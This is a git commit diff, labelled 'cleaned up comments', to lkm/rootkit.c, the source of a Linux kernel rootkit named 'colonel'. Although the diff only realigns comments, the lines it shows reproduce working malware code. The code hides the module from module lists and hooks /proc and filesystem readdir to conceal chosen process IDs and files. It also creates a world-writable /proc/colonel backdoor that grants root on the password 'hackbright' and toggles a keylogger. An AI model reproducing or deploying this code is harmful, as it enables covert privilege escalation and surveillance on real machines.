b171de7f6170c452abd2db9761ae0271ffc70db8
parallels <parallels@parallels-Parallels-Virtual-Platform.(none)>
2013-08-14 16:09:50 -0700

    cleaned up comments

--- lkm/rootkit.c
+++ lkm/rootkit.c
@@ -8,8 +8,8 @@
 #define MIN(a,b) \
    ({ typeof (a) _a = (a); \
       typeof (b) _b = (b); \
-     _a < _b ? _a : _b; })						/* typesafe macro for retrieving the min value */
-#define MAX_PIDS 50							/* the maximum number of hidden PIDs */
+     _a < _b ? _a : _b; })											/* typesafe macro for retrieving the min value */
+#define MAX_PIDS 50												/* the maximum number of hidden PIDs */
 
 MODULE_LICENSE("GPL");
 
@@ -50,45 +50,45 @@ static char module_status[1024];
 
 /* MODULE FUNCTIONS */
 void hide_module(void) {
-	if (hidden_module) {						/* if already hidden, return with no error */
+	if (hidden_module) {											/* if already hidden, return with no error */
 		return;
 	}
 
-	prev_module = THIS_MODULE->list.prev;				/* stores rootkit entry */
-	list_del(&THIS_MODULE->list);					/* removes rootkit entry from modules list */
+	prev_module = THIS_MODULE->list.prev;									/* stores rootkit entry */
+	list_del(&THIS_MODULE->list);										/* removes rootkit entry from modules list */
 
-	prev_kobj_module = THIS_MODULE->mkobj.kobj.entry.prev;		/* stores kobject */
-	kobject_del(&THIS_MODULE->mkobj.kobj);				/* removes kobjects */
+	prev_kobj_module = THIS_MODULE->mkobj.kobj.entry.prev;							/* stores kobject */
+	kobject_del(&THIS_MODULE->mkobj.kobj);									/* removes kobjects */
 	list_del(&THIS_MODULE->mkobj.kobj.entry);
 
-	hidden_module = !hidden_module;					/* sets the module switch to 1 */
+	hidden_module = !hidden_module;										/* sets the module switch to 1 */
 }
  
 void show_module(void) {
 	int restore;
 
-	if (!hidden_module) {						/* if already showing (0), return with no error */
+	if (!hidden_module) {											/* if already showing (0), return with no error */
 		return;
 	}
 
-	list_add(&THIS_MODULE->list, prev_module);			/* restores module entry */
+	list_add(&THIS_MODULE->list, prev_module);								/* restores module entry */
 
-	restore = kobject_add(&THIS_MODULE->mkobj.kobj, 		/* restores kobject */
+	restore = kobject_add(&THIS_MODULE->mkobj.kobj, 							/* restores kobject */
 	 	              THIS_MODULE->mkobj.kobj.parent, "col");
 
-	hidden_module = !hidden_module;					/* sets module switch to 0*/
+	hidden_module = !hidden_module;										/* sets module switch to 0*/
 }
 
 /* PAGE READ/WRITE FUNCTIONS */ 
 static void set_addr_rw(void *addr) {
 	unsigned int level;
-	pte_t *pte = lookup_address((unsigned long) addr, &level);	/* get what page the address is on */
+	pte_t *pte = lookup_address((unsigned long) addr, &level);						/* get what page the address is on */
 	if (pte->pte &~ _PAGE_RW) {
-		pte->pte |= _PAGE_RW;					/* set page read/write */
+		pte->pte |= _PAGE_RW;										/* set page read/write */
 	}
 }
 
-static void set_addr_ro(void *addr) {					/* resets to original permissions */
+static void set_addr_ro(void *addr) {										/* resets to original permissions */
 	unsigned int level;
 	pte_t *pte = lookup_address((unsigned long) addr, &level);
 	pte->pte = pte->pte &~_PAGE_RW;
@@ -101,37 +101,37 @@ u64 ino, unsigned d_type) {
 	int i;
 	for (i=0; i < current_pid; i++) {
 		if (!strcmp(name, hidden_pids[i])) {
-			return 0;					/* ensures any matches to hidden PIDs aren't shown */
+			return 0;										/* ensures any matches to hidden PIDs aren't shown */
 		}
 	}
 
 	if (!strcmp(name, "colonel")) {			
-		return 0;						/* ensures any matches to rootkit aren't shown */
+		return 0;											/* ensures any matches to rootkit aren't shown */
 	}
 
-	return og_proc_filldir(buf, name, namelen, offset, ino, d_type);	/* invokes the original */
+	return og_proc_filldir(buf, name, namelen, offset, ino, d_type);					/* invokes the original */
 }
 
 static int new_proc_readdir(struct file *filp, void *dirent, filldir_t filldir) {
-	og_proc_filldir = filldir; 					/* stores the original filldir */
-	return og_proc_readdir(filp, dirent, new_proc_filldir);		/* passes the modified function */
+	og_proc_filldir = filldir; 										/* stores the original filldir */
+	return og_proc_readdir(filp, dirent, new_proc_filldir);							/* passes the modified function */
 }
 
 static int new_fs_filldir(void *buf, const char *name, int namelen, loff_t offset, 
 						  u64 ino, unsigned d_type) {
-	if (hidden_files && (!strncmp(name, "__col", 5) || !strncmp(name, "7-__col", 7))) {	/* hides the file if prefix matches */
+	if (hidden_files && (!strncmp(name, "__col", 5) || !strncmp(name, "7-__col", 7))) {			/* hides the file if prefix matches */
 		return 0;
 	}
-	return og_fs_filldir(buf, name, namelen, offset, ino, d_type);	/* invokes the original */
+	return og_fs_filldir(buf, name, namelen, offset, ino, d_type);						/* invokes the original */
 }
 
 static int new_fs_readdir(struct file *filp, void *dirent, filldir_t filldir) {
-	og_fs_filldir = filldir;					/* comparable to the /proc version */
+	og_fs_filldir = filldir;										/* comparable to the /proc version */
 	return og_fs_readdir(filp, dirent, new_fs_filldir);
 }
 
 static int read_colonel(char *buffer, char **buffer_location, off_t off, 
-						int count, int *eof, void *data) {	/* reads /proc/colonel */
+						int count, int *eof, void *data) {				/* reads /proc/colonel */
 	int size;
 
 	sprintf(module_status, 
@@ -174,35 +174,35 @@ STATUS-------------------------------------------\n\
 		memcpy(buffer, module_status+off, count);
 	}
   
-	return size-off;						/* starts at given offset */
+	return size-off;											/* starts at given offset */
 }
 
 /* listens and processes commands written to /proc/colonel
  * write_colonel uses strncmp to compare input to colonel commands */
 static int write_colonel(struct file *file, const char __user *buff, unsigned long count, void *data) {
-	if (!strncmp(buff, "hackbright", MIN(10, count))) {		/* become root */
+	if (!strncmp(buff, "hackbright", MIN(10, count))) {							/* become root */
 		struct cred *credentials = prepare_creds();
 		credentials->uid = credentials->euid = 0;
 		credentials->gid = credentials->egid = 0;
 		commit_creds(credentials);
 
-	} else if (!strncmp(buff, "hp", MIN(2, count))) {		/* hides process id */
+	} else if (!strncmp(buff, "hp", MIN(2, count))) {							/* hides process id */
 		if (current_pid < MAX_PIDS) strncpy(hidden_pids[current_pid++], buff+2, MIN(7, count-2));
 
-	} else if (!strncmp(buff, "sp", MIN(2, count))) {		/* shows last hidden process */
+	} else if (!strncmp(buff, "sp", MIN(2, count))) {							/* shows last hidden process */
 		if (current_pid > 0) current_pid--;
 
-	} else if ((!strncmp(buff, "tls", MIN(3, count))) || (!strncmp(buff, "keylog", MIN(6, count)))) { /* toggle keylogger on/off */
+	} else if ((!strncmp(buff, "tls", MIN(3, count))) || (!strncmp(buff, "keylog", MIN(6, count)))) {	/* toggle keylogger on/off */
 		key_logger = !key_logger;
 		if (current_pid > 1) current_pid--;
 
-	} else if (!strncmp(buff, "thf", MIN(3, count))) {		/* toggles hidden_files in fs */
+	} else if (!strncmp(buff, "thf", MIN(3, count))) {							/* toggles hidden_files in fs */
 		hidden_files = !hidden_files;
 
-	} else if (!strncmp(buff, "mh", MIN(2, count))) {		/* hide module (rootkit) */
+	} else if (!strncmp(buff, "mh", MIN(2, count))) {							/* hide module (rootkit) */
 		hide_module();
 
-	} else if (!strncmp(buff, "ms", MIN(2, count))) {		/* show module (rootkit) */
+	} else if (!strncmp(buff, "ms", MIN(2, count))) {							/* show module (rootkit) */
 		show_module();
 	}
 	
@@ -214,13 +214,13 @@ static int write_colonel(struct file *file, const char __user *buff, unsigned lo
 /* NULL checks for sanity */ 
 static void clean_procfs(void) {
 	if (proc_colonel != NULL) {
-		remove_proc_entry("colonel", NULL);			/* removes /proc/colonel */
+		remove_proc_entry("colonel", NULL);								/* removes /proc/colonel */
 		proc_colonel = NULL;
 	}
 	
 	if (proc_fops != NULL && og_proc_readdir != NULL) {
 		set_addr_rw(proc_fops);
-		proc_fops->readdir = og_proc_readdir;			/* restores the original /proc readdir */
+		proc_fops->readdir = og_proc_readdir;								/* restores the original /proc readdir */
 		set_addr_ro(proc_fops);
 	}
 }
@@ -228,13 +228,13 @@ static void clean_procfs(void) {
 static void clean_fs(void) {
 	if (fs_fops != NULL && og_fs_readdir != NULL) {
 		set_addr_rw(fs_fops);
-		fs_fops->readdir = og_fs_readdir;			/* restore original fs readdir */
+		fs_fops->readdir = og_fs_readdir;								/* restore original fs readdir */
 		set_addr_ro(fs_fops);
 	}
 }
 
 static int __init procfs_init(void) {
-	proc_colonel = create_proc_entry("colonel", 0666, NULL);	/* creates /proc/colonel in /proc */
+	proc_colonel = create_proc_entry("colonel", 0666, NULL);						/* creates /proc/colonel in /proc */
 	if (NULL == proc_colonel) {
 		return 0;
 	}
@@ -244,14 +244,14 @@ static int __init procfs_init(void) {
 		return 0;
 	}
 
-	proc_colonel->read_proc = read_colonel;				/* sets custom read function */
-	proc_colonel->write_proc = write_colonel;			/* sets custom write function */
+	proc_colonel->read_proc = read_colonel;									/* sets custom read function */
+	proc_colonel->write_proc = write_colonel;								/* sets custom write function */
 	
 	/* (using page mode change) */
 	proc_fops = ((struct file_operations *) proc_root->proc_fops);
 	og_proc_readdir = proc_fops->readdir;
 	set_addr_rw(proc_fops);
-	proc_fops->readdir = new_proc_readdir;				/* passes custom readdir */
+	proc_fops->readdir = new_proc_readdir;									/* passes custom readdir */
 	set_addr_ro(proc_fops);
 	
 	return 1;
@@ -259,7 +259,7 @@ static int __init procfs_init(void) {
 
 static int __init fs_init(void) {
 	struct file *etc_filp;
-	etc_filp = filp_open("/etc", O_RDONLY, 0);			/* retrieves file_operations of /etc */
+	etc_filp = filp_open("/etc", O_RDONLY, 0);								/* retrieves file_operations of /etc */
 	if (NULL == etc_filp) {
 		return 0;
 	}
@@ -269,7 +269,7 @@ static int __init fs_init(void) {
 	
 	og_fs_readdir = fs_fops->readdir;
 	set_addr_rw(fs_fops);
-	fs_fops->readdir = new_fs_readdir;				/* passes custom readdir */ 
+	fs_fops->readdir = new_fs_readdir;									/* passes custom readdir */ 
 	set_addr_ro(fs_fops);
 	
 	return 1;
